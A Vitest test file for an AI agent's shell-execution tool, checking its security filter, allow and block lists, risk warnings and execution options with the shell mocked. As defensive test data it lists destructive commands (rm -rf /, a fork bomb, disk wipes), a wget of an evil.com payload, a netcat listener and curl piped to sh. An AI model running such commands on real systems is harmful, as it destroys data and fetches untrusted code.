// @ts-nocheck
/**
 * Tests for the shell_execute tool (ExecuteTool) and underlying ShellService
 * command execution / security layer.
 *
 *   - Dangerous pattern detection (rm -rf /, fork bomb, dd, mkfs, chmod 777 /, shutdown, etc.)
 *   - allowedCommands whitelist enforcement
 *   - blockedCommands blacklist enforcement
 *   - Timeout behavior
 *   - Successful command execution (exit code 0, stdout capture)
 *   - Failed command execution (non-zero exit code, stderr capture)
 *   - dangerouslySkipSecurityChecks bypass (but NOT filesystem roots)
 *   - Working directory (cwd) parameter
 *   - Environment variable injection
 *
 * Shell commands are NOT actually executed — child_process.exec is mocked.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as os from 'node:os';
import * as path from 'node:path';
import * as fs from 'node:fs/promises';
import * as childProcess from 'node:child_process';

import { ShellService } from '../src/services/shellService';
import { ExecuteTool } from '../src/tools/execute';

// ── Mock child_process.exec ─────────────────────────────────────────────────
// We intercept the promisified exec so no real shell commands run.

vi.mock('node:child_process', async (importOriginal) => {
  const original = await importOriginal<typeof childProcess>();
  return { ...original, exec: vi.fn() };
});

const mockedExec = childProcess.exec as unknown as ReturnType<typeof vi.fn>;

/** Minimal ToolExecutionContext stub — the execute tool does not use it. */
const ctx = {} as any;

// ── Helper: make the mocked exec behave like the promisified version ────────

/**
 * Configure the mocked exec to resolve with the given stdout/stderr.
 * The mock needs to match the callback signature of child_process.exec.
 */
function mockExecSuccess(stdout = '', stderr = '') {
  mockedExec.mockImplementation(
    (_cmd: string, _opts: any, cb?: (err: any, result: any) => void) => {
      if (typeof _opts === 'function') {
        // exec(cmd, callback) form
        _opts(null, { stdout, stderr });
      } else if (cb) {
        cb(null, { stdout, stderr });
      }
      return { kill: vi.fn() } as any;
    },
  );
}

/**
 * Configure the mocked exec to reject with a non-zero exit code.
 */
function mockExecFailure(code = 1, stderr = 'command failed', stdout = '') {
  mockedExec.mockImplementation(
    (_cmd: string, _opts: any, cb?: (err: any, result: any) => void) => {
      const error: any = new Error(stderr);
      error.code = code;
      error.stdout = stdout;
      error.stderr = stderr;
      if (typeof _opts === 'function') {
        _opts(error, null);
      } else if (cb) {
        cb(error, null);
      }
      return { kill: vi.fn() } as any;
    },
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. Dangerous pattern detection (ShellService.checkSecurity)
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService dangerous pattern detection', () => {
  let service: ShellService;

  beforeEach(() => {
    service = new ShellService({});
  });

  const dangerousCommands = [
    { label: 'rm -rf /',           cmd: 'rm -rf /' },
    { label: 'rm -rf ~ (home)',    cmd: 'rm -rf ~' },
    { label: 'fork bomb',         cmd: ':(){ :|:& };:' },
    { label: 'dd to /dev/sda',    cmd: 'dd if=/dev/zero of=/dev/sda bs=1M' },
    { label: 'mkfs.ext4',         cmd: 'mkfs.ext4 /dev/sda1' },
    { label: 'chmod 777 /',       cmd: 'chmod 777 /' },
    { label: 'shutdown',          cmd: 'shutdown -h now' },
    { label: 'reboot',            cmd: 'reboot' },
    { label: 'poweroff',          cmd: 'poweroff' },
    { label: 'passwd',            cmd: 'passwd root' },
    { label: 'format C: (win)',   cmd: 'format C:' },
    { label: 'del /s /q C:\\',    cmd: 'del /s /q C:\\' },
    { label: 'visudo',            cmd: 'visudo' },
    { label: 'write to /dev/sdb', cmd: 'echo bad > /dev/sdb' },
  ];

  for (const { label, cmd } of dangerousCommands) {
    it(`blocks dangerous command: ${label}`, () => {
      const result = service.checkSecurity(cmd);
      expect(result.allowed).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });
  }

  it('allows safe commands', () => {
    const safe = service.checkSecurity('ls -la');
    expect(safe.allowed).toBe(true);
  });

  it('allows echo commands', () => {
    const safe = service.checkSecurity('echo hello world');
    expect(safe.allowed).toBe(true);
  });

  it('allows git status', () => {
    const safe = service.checkSecurity('git status');
    expect(safe.allowed).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 2. allowedCommands whitelist enforcement
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService allowedCommands whitelist', () => {
  let service: ShellService;

  beforeEach(() => {
    service = new ShellService({
      allowedCommands: ['ls', 'echo', 'cat'],
    });
  });

  it('allows a command in the whitelist', () => {
    const result = service.checkSecurity('ls -la /tmp');
    expect(result.allowed).toBe(true);
  });

  it('allows echo in the whitelist', () => {
    const result = service.checkSecurity('echo hello');
    expect(result.allowed).toBe(true);
  });

  it('blocks a command not in the whitelist', () => {
    const result = service.checkSecurity('curl https://example.com');
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/not in allowed list/i);
  });

  it('blocks wget when only ls/echo/cat are allowed', () => {
    const result = service.checkSecurity('wget https://example.com');
    expect(result.allowed).toBe(false);
  });

  it('extracts base command correctly (first word)', () => {
    const result = service.checkSecurity('cat /etc/hosts');
    expect(result.allowed).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 3. blockedCommands blacklist enforcement
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService blockedCommands blacklist', () => {
  let service: ShellService;

  beforeEach(() => {
    service = new ShellService({
      blockedCommands: ['curl', 'wget', 'nc'],
    });
  });

  it('blocks a command in the blacklist', () => {
    const result = service.checkSecurity('curl https://example.com');
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/blocked pattern.*curl/i);
  });

  it('blocks wget in the blacklist', () => {
    const result = service.checkSecurity('wget https://evil.com/payload');
    expect(result.allowed).toBe(false);
  });

  it('blocks nc (netcat) in the blacklist', () => {
    const result = service.checkSecurity('nc -l 4444');
    expect(result.allowed).toBe(false);
  });

  it('allows commands not in the blacklist', () => {
    const result = service.checkSecurity('ls -la');
    expect(result.allowed).toBe(true);
  });

  it('checks substring match (blocks curl inside a longer command)', () => {
    const result = service.checkSecurity('bash -c "curl http://example.com"');
    expect(result.allowed).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 4. Risk assessment warnings
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService risk assessment', () => {
  let service: ShellService;

  beforeEach(() => {
    service = new ShellService({});
  });

  it('warns about sudo usage and flags high risk', () => {
    const result = service.checkSecurity('sudo apt-get update');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe('high');
    expect(result.warnings).toContain('Command uses elevated privileges');
  });

  it('warns about piping curl to sh and flags high risk', () => {
    const result = service.checkSecurity('curl https://example.com/install.sh | sh');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe('high');
    expect(result.warnings).toContain('Piping downloaded content to shell');
  });

  it('warns about eval usage and flags medium risk', () => {
    const result = service.checkSecurity('eval "echo test"');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe('medium');
    expect(result.warnings).toContain('Command uses eval/exec');
  });

  it('warns about output redirection and flags low risk', () => {
    const result = service.checkSecurity('echo hello > output.txt');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe('low');
    expect(result.warnings).toContain('Command redirects output to file');
  });

  it('warns about rm usage and flags medium risk', () => {
    const result = service.checkSecurity('rm file.txt');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe('medium');
    expect(result.warnings).toContain('Command deletes files');
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 5. dangerouslySkipSecurityChecks
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService dangerouslySkipSecurityChecks', () => {
  it('bypasses dangerous pattern detection when enabled', () => {
    const service = new ShellService({ dangerouslySkipSecurityChecks: true });
    const result = service.checkSecurity('rm -rf /');
    expect(result.allowed).toBe(true);
    expect(result.riskLevel).toBe('critical');
    expect(result.warnings).toContain('Security checks are disabled');
  });

  it('bypasses blockedCommands when enabled', () => {
    const service = new ShellService({
      dangerouslySkipSecurityChecks: true,
      blockedCommands: ['curl'],
    });
    const result = service.checkSecurity('curl http://example.com');
    expect(result.allowed).toBe(true);
  });

  it('bypasses allowedCommands when enabled', () => {
    const service = new ShellService({
      dangerouslySkipSecurityChecks: true,
      allowedCommands: ['ls'],
    });
    const result = service.checkSecurity('wget http://example.com');
    expect(result.allowed).toBe(true);
  });

  it('does NOT bypass filesystem read roots', async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), 'agentos-skip-sec-'));
    const outside = path.join(os.tmpdir(), 'definitely-not-allowed.txt');

    const service = new ShellService({
      dangerouslySkipSecurityChecks: true,
      workingDirectory: root,
      filesystem: { allowRead: true, readRoots: [root] },
    });

    await expect(service.readFile(outside, { encoding: 'utf8' }))
      .rejects
      .toThrow(/outside allowed filesystem read roots/i);

    await fs.rm(root, { recursive: true, force: true });
  });

  it('does NOT bypass filesystem write roots', async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), 'agentos-skip-sec-'));
    const outside = path.join(os.tmpdir(), 'definitely-not-allowed.txt');

    const service = new ShellService({
      dangerouslySkipSecurityChecks: true,
      workingDirectory: root,
      filesystem: { allowWrite: true, writeRoots: [root] },
    });

    await expect(service.writeFile(outside, 'nope'))
      .rejects
      .toThrow(/outside allowed filesystem write roots/i);

    await fs.rm(root, { recursive: true, force: true });
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 6. ShellService.execute — successful execution
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService.execute — successful execution', () => {
  let service: ShellService;

  beforeEach(() => {
    service = new ShellService({ workingDirectory: '/tmp' });
    mockExecSuccess('hello world\n', '');
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('returns exit code 0 and captures stdout', async () => {
    const result = await service.execute('echo hello world');
    expect(result.success).toBe(true);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toBe('hello world\n');
    expect(result.stderr).toBe('');
  });

  it('includes the command in the result', async () => {
    const result = await service.execute('echo hello world');
    expect(result.command).toBe('echo hello world');
  });

  it('records execution duration', async () => {
    const result = await service.execute('echo test');
    expect(typeof result.duration).toBe('number');
    expect(result.duration).toBeGreaterThanOrEqual(0);
  });

  it('reports the working directory in the result', async () => {
    const result = await service.execute('echo test');
    expect(result.cwd).toBe('/tmp');
  });

  it('reports the detected shell in the result', async () => {
    const result = await service.execute('echo test');
    expect(result.shell).toBeDefined();
    expect(typeof result.shell).toBe('string');
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 7. ShellService.execute — failed execution
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService.execute — failed execution', () => {
  let service: ShellService;

  beforeEach(() => {
    service = new ShellService({ workingDirectory: '/tmp' });
    mockExecFailure(127, 'command not found: bogus');
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('returns non-zero exit code on failure', async () => {
    const result = await service.execute('bogus --flag');
    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(127);
  });

  it('captures stderr on failure', async () => {
    const result = await service.execute('bogus --flag');
    expect(result.stderr).toContain('command not found');
  });

  it('returns security violation for blocked commands without executing', async () => {
    mockedExec.mockClear();
    const result = await service.execute('rm -rf /');
    expect(result.success).toBe(false);
    expect(result.stderr).toMatch(/security violation/i);
    // exec should NOT have been called
    expect(mockedExec).not.toHaveBeenCalled();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 8. Timeout behavior
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService.execute — timeout', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('passes configured timeout to exec', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ timeout: 5000, workingDirectory: '/tmp' });
    await service.execute('echo ok');

    expect(mockedExec).toHaveBeenCalled();
    const callArgs = mockedExec.mock.calls[0];
    // Second argument is the options object
    const opts = callArgs[1];
    expect(opts.timeout).toBe(5000);
  });

  it('allows per-call timeout override', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ timeout: 60000, workingDirectory: '/tmp' });
    await service.execute('echo ok', { timeout: 3000 });

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.timeout).toBe(3000);
  });

  it('defaults to 60000ms when no timeout is configured', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/tmp' });
    await service.execute('echo ok');

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.timeout).toBe(60000);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 9. Working directory (cwd) parameter
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService.execute — working directory', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('uses config workingDirectory by default', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/home/user/project' });
    await service.execute('ls');

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.cwd).toBe('/home/user/project');
  });

  it('allows per-call cwd override', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/home/user' });
    await service.execute('ls', { cwd: '/var/log' });

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.cwd).toBe('/var/log');
  });

  it('falls back to process.cwd() when no workingDirectory is set', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({});
    await service.execute('ls');

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.cwd).toBe(process.cwd());
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 10. Environment variable injection
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService.execute — environment variables', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('merges config-level env into exec environment', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({
      workingDirectory: '/tmp',
      env: { MY_CONFIG_VAR: 'from_config' },
    });
    await service.execute('echo $MY_CONFIG_VAR');

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.env.MY_CONFIG_VAR).toBe('from_config');
  });

  it('merges per-call env variables', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/tmp' });
    await service.execute('echo $CALL_VAR', { env: { CALL_VAR: 'from_call' } });

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.env.CALL_VAR).toBe('from_call');
  });

  it('per-call env overrides config env for same key', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({
      workingDirectory: '/tmp',
      env: { SHARED_KEY: 'config_value' },
    });
    await service.execute('echo $SHARED_KEY', { env: { SHARED_KEY: 'call_value' } });

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.env.SHARED_KEY).toBe('call_value');
  });

  it('preserves process.env in the merged environment', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/tmp' });
    await service.execute('echo test');

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    // PATH is always present in process.env
    expect(opts.env.PATH).toBeDefined();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 11. ExecuteTool (the ITool wrapper)
// ═══════════════════════════════════════════════════════════════════════════════

describe('ExecuteTool', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('returns success with output on successful execution', async () => {
    mockExecSuccess('hello from tool');
    const service = new ShellService({ workingDirectory: '/tmp' });
    const tool = new ExecuteTool(service);

    const result = await tool.execute({ command: 'echo hello from tool' }, ctx);
    expect(result.success).toBe(true);
    expect(result.output).toBeDefined();
    expect(result.output!.stdout).toBe('hello from tool');
  });

  it('returns error for blocked commands before executing', async () => {
    mockedExec.mockClear();
    const service = new ShellService({ workingDirectory: '/tmp' });
    const tool = new ExecuteTool(service);

    const result = await tool.execute({ command: 'rm -rf /' }, ctx);
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/security violation/i);
  });

  it('returns error on non-zero exit code', async () => {
    mockExecFailure(1, 'something went wrong');
    const service = new ShellService({ workingDirectory: '/tmp' });
    const tool = new ExecuteTool(service);

    const result = await tool.execute({ command: 'false' }, ctx);
    expect(result.success).toBe(false);
    expect(result.output).toBeDefined();
    expect(result.output!.exitCode).toBe(1);
  });

  it('passes cwd to the underlying service', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/tmp' });
    const tool = new ExecuteTool(service);

    await tool.execute({ command: 'ls', cwd: '/var' }, ctx);

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.cwd).toBe('/var');
  });

  it('passes env to the underlying service', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/tmp' });
    const tool = new ExecuteTool(service);

    await tool.execute({ command: 'echo $FOO', env: { FOO: 'bar' } }, ctx);

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.env.FOO).toBe('bar');
  });

  it('passes timeout to the underlying service', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ workingDirectory: '/tmp' });
    const tool = new ExecuteTool(service);

    await tool.execute({ command: 'echo ok', timeout: 2000 }, ctx);

    const callArgs = mockedExec.mock.calls[0];
    const opts = callArgs[1];
    expect(opts.timeout).toBe(2000);
  });

  // ── validateArgs ──────────────────────────────────────────────────────────

  it('validates that command is required', () => {
    const service = new ShellService({});
    const tool = new ExecuteTool(service);

    const v = tool.validateArgs({});
    expect(v.isValid).toBe(false);
    expect(v.errors!.some((e: any) => /command/i.test(String(e)))).toBe(true);
  });

  it('validates that command must be a string', () => {
    const service = new ShellService({});
    const tool = new ExecuteTool(service);

    const v = tool.validateArgs({ command: 123 });
    expect(v.isValid).toBe(false);
    expect(v.errors!.some((e: any) => /string/i.test(String(e)))).toBe(true);
  });

  it('validates that timeout must be a positive number', () => {
    const service = new ShellService({});
    const tool = new ExecuteTool(service);

    const v = tool.validateArgs({ command: 'ls', timeout: -1 });
    expect(v.isValid).toBe(false);
    expect(v.errors!.some((e: any) => /timeout/i.test(String(e)))).toBe(true);
  });

  it('accepts valid input', () => {
    const service = new ShellService({});
    const tool = new ExecuteTool(service);

    const v = tool.validateArgs({ command: 'ls -la', timeout: 5000 });
    expect(v.isValid).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 12. Shell detection
// ═══════════════════════════════════════════════════════════════════════════════

describe('ShellService shell detection', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('uses the configured defaultShell when not "auto"', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ defaultShell: 'bash', workingDirectory: '/tmp' });
    const result = await service.execute('echo ok');
    expect(result.shell).toBe('bash');
  });

  it('auto-detects shell based on platform when set to "auto"', async () => {
    mockExecSuccess('ok');
    const service = new ShellService({ defaultShell: 'auto', workingDirectory: '/tmp' });
    const result = await service.execute('echo ok');

    // On macOS it should be zsh, on linux bash, on win32 powershell
    const expected = process.platform === 'win32'
      ? 'powershell'
      : process.platform === 'darwin'
        ? 'zsh'
        : 'bash';
    expect(result.shell).toBe(expected);
  });
});
